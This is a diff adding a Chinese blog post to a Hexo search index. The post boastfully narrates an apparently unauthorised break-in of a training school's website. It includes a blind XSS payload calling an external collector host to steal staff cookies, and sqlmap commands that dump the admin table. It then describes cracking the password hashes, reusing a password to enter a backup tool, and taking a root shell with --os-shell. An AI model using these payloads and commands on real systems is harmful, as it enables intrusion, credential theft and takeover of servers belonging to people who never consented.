@@ -17,6 +17,25 @@
     
     
     <entry>
+      <title>记一次以小勃大，紧张刺激的渗透测试</title>
+      <link href="/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <url>/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>emmm，炎炎夏日到来，这么个桑拿天干什么好呢？</p><p>没错，一定要坐在家里，吹着空调，吃着西瓜，然后静静地挖洞。挖洞完叫个外卖，喝着啤酒，撸着烧烤，岂不美哉？然此可为智者道，难为俗人言也。。。正在我沉迷在对夏日的意淫之时，我亲爱的妈妈忽然给我来了一波夺命连环call。<br><img src="https://s2.loli.net/2023/04/19/AkbOQ8mXJrWGciF.png" alt="image"></p><pre><code>大概内容如下：   --妈妈：儿呀。。。你印布隐私（认不认识）搞公务员培训的机构，帮我在网上瞅瞅去，我有个朋友他儿想考公务员~   --我：（声音笑嘻嘻，心里mmp）哎呀，这个bia的天，搁家里睡觉行了。。别弄了。。   --妈妈：MLGB，叫你整，你就快点的，晚上给我回电话。     哎，父母之命不可违，悲伤的我只能放下手里的键盘和瓜皮，开始去百度上找培训机构。</code></pre><p><img src="https://s2.loli.net/2023/04/19/8SXb7ntzhoQa1VW.png" alt="image"></p><p>百度上面找了好久，都没找到太合适的。问了问身边的朋友：朋友给了一家网校的报名地址<br><a href="http://xxxxx.com/3g/***/2203947.htm">http://xxxxx.com/3g/***/2203947.htm</a><br><img src="https://s2.loli.net/2023/04/19/XGxvwty2PqhbYFm.png" alt="image"></p><p>没错，还带免费试学。。。真的先进。。。。<br>于是打开爱站查了一波权重。。。<br><img src="https://s2.loli.net/2023/04/19/7h8WRjPqx2pzUti.png" alt="image"></p><p>这尼玛？？？百度权7，emmm，有点意思。见到这么高权重的站，那时我已饥渴难耐，便决定对此站点来一波渗透测试。</p><h2 id="二、XSS盲打？安排一下"><a href="#二、XSS盲打？安排一下" class="headerlink" title="二、XSS盲打？安排一下"></a>二、XSS盲打？安排一下</h2><p><img src="https://s2.loli.net/2023/04/19/TBtgFWdhwo1rHva.png" alt="image"></p><p>看到这里，小伙伴们肯定想。。。emm，是不是可以XSS打一下试试呢？<br>说干咱就干。。。见框就插,接下来就插入xss payload试试吧。。。<br>Payload: <code>&lt;/textarea&gt;&lt;script src=&quot;=&quot;http://xsspt.com/z6ocdy?1531815744&quot;&gt;&lt;/script&gt;</code><br>将payload完整黏贴进去，如图发现仅有&lt;&#x2F;tex    这四个字符<br><img src="https://s2.loli.net/2023/04/19/qlosKBVe4MQ7wnT.png" alt="image"></p><p>审查元素看下，在表单处理上设置了maxlength，直接审查元素大法改掉就好了<br>max length改为999<br><img src="https://s2.loli.net/2023/04/19/INOkbRoaCGU2trM.png" alt="image"><br> 然后我们的XSS Payload就可以正常地全部输入到表单中了<br><img src="https://s2.loli.net/2023/04/19/rEiRl8Oez6Y4Nbf.png" alt="image"></p><p>手机那个文本框，我随便填了11位数字，然后点击提交，万幸的的是提交成功了（后端没对内容进行验证）<br>过了大概1个小时，突然XSS平台的邮件来了，兴奋ing。。。（客服是真的敬业）<br><img src="https://s2.loli.net/2023/04/19/jFwefGsIN4zWPhA.png" alt="image"></p><p>拿着cookie，挂好代理傻啦吧唧地就是进入后台一波浏览，发现权限非常小，基本上只能处理处理客服工作<br><img src="https://s2.loli.net/2023/04/19/CDsozeBltMFfQnK.png" alt="image"></p><p>不过可以查看后台的管理员账号。。。。。（果然是个大站，后台分工权限这么讲究。。。）<br><img src="https://s2.loli.net/2023/04/19/ENcTCxLXKJve3qi.png" alt="image"></p><p>看着这么多的超级管理员账号，而我却只是个吊毛客服，基本上没什么权限，心里真的难受的一批。。<br>难道我们的渗透到这里就要结束？？不可能，这显然不符合本屌的风格。。。<br><img src="https://s2.loli.net/2023/04/19/7caIFXZzemCRuVf.png" alt="image"></p><p>于是我又仔细地翻了翻后台，看看有没有地方可以来一波骚操作。。。</p><h2 id="三、后台SQL注入？讲究"><a href="#三、后台SQL注入？讲究" class="headerlink" title="三、后台SQL注入？讲究"></a>三、后台SQL注入？讲究</h2><p>大家可以看到我们的客服处理界面是可以进行查询的，查询的过程是通过GET方式传导一个mobile参数实现查询</p><p>我们直接FUZZ了一下SQL注入的Payload，看看是否存在注入。</p><p>发现传递特殊字符后，页面没有返回信息，那么就很有可能存在SQL注入。<br><img src="https://s2.loli.net/2023/04/19/5yzX2oJbgBaNnGY.png" alt="image"></p><p>我们使用BurpSuite来抓取本出的的HTTP请求，然后保存在C:\Users\Samsung 700Z5C\Desktop\1.txt中<br><img src="https://s2.loli.net/2023/04/19/7UEgMCSLybF4YIH.png" alt="image"></p><p>接下来到了以小勃大，紧张刺激的时刻，使用SQLMAP的 -r参数，注入本HTTP请求<br><code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt</code><br><img src="https://s2.loli.net/2023/04/19/FQko9HntjrMm5T4.png" alt="image"></p><p>注入成功了。哈哈哈。。。。我们开始直奔管理员的表<br>命令为<code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt --tables -D &quot;nd_net&quot; </code>     &#x2F;&#x2F;列出nd_net数据库的表<br><img src="https://s2.loli.net/2023/04/19/aD5vJPpdItVkgU4.png" alt="image"></p><p>然后执行<br><code>sqlmap -r C:\Users\Samsung\Desktop\1.txt --columns -T &quot;net_admin_user&quot; -D &quot;nd_net&quot;   //列出net_admin_user</code>表的字段<br><img src="https://s2.loli.net/2023/04/19/syGtfThrBKvXSep.png" alt="image"></p><p>最后执行命令<br><code>sqlmap.py -r &quot;I:\T00l\1.txt&quot; --dump -C &quot;id,nd_user,userid,nd_pass&quot; -T &quot;net_admin_user&quot; -D &quot;nd_net&quot; --threads=10   //导出net_admin_user表中id,nd_user,userid,nd_pass几个字段的数据</code><br><img src="https://s2.loli.net/2023/04/19/oRmSxVl5zUELvXQ.png" alt="image"></p><p>全部是md5加密，拿到cmd5，一波解密，成功获取到所有管理员的账号密码，然后成功登陆以管理员的权限登陆后台<br><img src="https://s2.loli.net/2023/04/19/wuAtjc89YFPogmb.png" alt="image"></p><p>哈哈，讲究！</p><h2 id="四、不拿Shell，与咸鱼有什么区别？"><a href="#四、不拿Shell，与咸鱼有什么区别？" class="headerlink" title="四、不拿Shell，与咸鱼有什么区别？"></a>四、不拿Shell，与咸鱼有什么区别？</h2><p>emm，就算是管理员的权限。我发现可以利用的地方依然很少，只有一些静态页面的编辑权限（而且编辑器是KindEditor，没什么方法上传拿Shell）,我当时十分绝望。。。但是我发现了这个——数据库备份<br><img src="https://s2.loli.net/2023/04/19/NgsyjOKr9BChRux.png" alt="image"></p><p>点击后，跳转到一款叫做“帝国备份王”的程序<br><img src="https://s2.loli.net/2023/04/19/ceJI6Q2SZquURYj.png" alt="image"></p><p>随后，我便去该程序的官网，下载了一个帮助文档。使用默认用户admin&#x2F;123456进行登陆，但是以失败告终。<br>但我怎末可能放弃，我一个一个测试了之前后台SQL注入得到的密码，最终在一个密码上成功地登陆了。。。</p><p>我靠，高兴死我。。。。。。。。<br><img src="https://s2.loli.net/2023/04/19/GIDgkBHJC7LNl3t.png" alt="image"></p><p>发现了一个PHP探针<br><img src="https://s2.loli.net/2023/04/19/fLXW47QSDBhOxyZ.png" alt="image"></p><p>再掏出SQLMAP，直接使用命令 用之前的注入点获取shell</p><p>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt –os-shell<br><img src="https://s2.loli.net/2023/04/19/ORNjiFl4C6t1MTh.png" alt="image"></p><p>输入我们通过探针得到的路径，很幸运，ROOT权限直接os-shell成功。直接上一句话，GetShell完美结束<br><img src="https://s2.loli.net/2023/04/19/NvHrg3s7CSXjh1n.png" alt="image"></p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本次渗透测试，虽然没有骚操作，但是总体来说用到了许多知识，现进行总结<br>1.XSS盲打技术<br>2.SQLMAP注入HTTP响应包的语法<br>3.人性的弱点分析（多个程序用同一个管理密码）<br>4.从获取绝对路径到SQLMAP获取shell<br>5.审查元素小技巧</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞挖掘 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP代码审计神器——RIPS个人汉化版</title>
       <link href="/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/"/>
       <url>/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/</url>
@@ -33,7 +52,7 @@
       
         <tags>
             
-            <tag> hexo </tag>
+            <tag> 代码审计 </tag>
             
         </tags>
       
